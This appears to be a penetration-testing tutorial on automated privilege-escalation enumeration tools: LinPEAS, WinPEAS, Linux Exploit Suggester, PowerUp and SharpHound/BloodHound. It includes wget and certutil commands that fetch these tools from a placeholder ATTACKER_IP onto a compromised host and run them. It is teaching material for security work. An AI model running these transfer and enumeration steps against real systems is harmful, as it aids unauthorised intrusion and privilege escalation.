# Introduction

Automated enumeration tools are scripts and frameworks designed to quickly identify privilege escalation opportunities on compromised systems.

After obtaining an initial shell, a penetration tester must gather information about the target machine.

Manual enumeration is important, but automated tools can help discover:

- Misconfigured permissions
- Vulnerable services
- Stored credentials
- Weak configurations
- Missing patches
- Dangerous privileges

The main objective:

```
Initial Access

↓

Run Enumeration Tools

↓

Identify Weaknesses

↓

Exploit Misconfiguration

↓

Privilege Escalation
```

---

# Why Automated Enumeration Matters

Privilege escalation often depends on small configuration mistakes.

Examples:

- A writable service file
- A dangerous sudo permission
- A vulnerable kernel version
- Stored credentials
- Weak registry permissions

Finding all possible weaknesses manually can be time-consuming.

Automated tools speed up the process by checking hundreds of possible attack vectors.

# Manual vs Automated Enumeration

## Manual Enumeration

Advantages:

- Better understanding of the system
- Less noise
- More control
- Useful during exams

Examples:

```bash
whoami

id

uname -a

sudo -l
```

---

## Automated Enumeration

Advantages:

- Faster discovery
- Checks many possibilities
- Finds uncommon misconfigurations

Examples:

```
LinPEAS

WinPEAS

PowerUp
```

---

# LinPEAS

LinPEAS is one of the most popular Linux privilege escalation enumeration tools.

It searches for:

- Sudo permissions
- SUID binaries
- Cron jobs
- Writable files
- Credentials
- Kernel vulnerabilities
- Capabilities
- Network information

---

## Download LinPEAS

From attacker machine:

```bash
python3 -m http.server 80
```

On target:

```bash
wget http://ATTACKER_IP/linpeas.sh
```

---

## Execute

```bash
chmod +x linpeas.sh

./linpeas.sh
```

---

Important findings:

```
Sudo permissions

Writable files

SUID binaries

Passwords

Kernel exploits
```

---

# WinPEAS

WinPEAS is the Windows equivalent of LinPEAS.

It searches for:

- User information
- Services
- Registry weaknesses
- Stored credentials
- Scheduled tasks
- Installed software
- Privileges

---

## Transfer WinPEAS

Example:

```cmd
certutil -urlcache -f http://ATTACKER_IP/winpeas.exe winpeas.exe
```

---

## Execute

```cmd
winpeas.exe
```

---

Interesting results:

```
Unquoted service paths

Weak permissions

Saved credentials

Token privileges
```

# Linux Exploit Suggester

Linux Exploit Suggester searches for possible kernel vulnerabilities.

Check kernel:

```bash
uname -a
```

Run:

```bash
./linux-exploit-suggester.sh
```

It compares:

```
Kernel Version

↓

Known Vulnerabilities

↓

Possible Exploits
```

# PowerUp

PowerUp is a PowerShell privilege escalation framework.

It focuses on Windows misconfigurations.

Checks:

- Services
- Registry
- DLL hijacking
- Stored credentials
- Permissions

---

Import:

```powershell
Import-Module .\PowerUp.ps1
```

Run:

```powershell
Invoke-AllChecks
```

---

Example findings:

```
Service is modifiable

Registry key writable

Unquoted service path
```

---

# BloodHound

BloodHound is an Active Directory analysis tool.

It maps relationships between:

- Users
- Groups
- Computers
- Permissions

It identifies attack paths such as:

```
User

↓

Group Membership

↓

Admin Rights

↓

Domain Admin
```

---

Common collector:

```
SharpHound
```

Example:

```powershell
SharpHound.exe -c All
```

# Limitations of Automated Tools

Automated tools are not perfect.

Problems:

- False positives
- False negatives
- Missing custom vulnerabilities
- Generating lots of output
- Detection limitations

A penetration tester must understand the results.

Never blindly exploit everything reported.

---

# Defense & Mitigation

Protect systems by:

- Regular vulnerability scanning
- Applying security patches
- Reviewing permissions
- Removing unnecessary privileges
- Monitoring changes
- Securing services
- Auditing user accounts
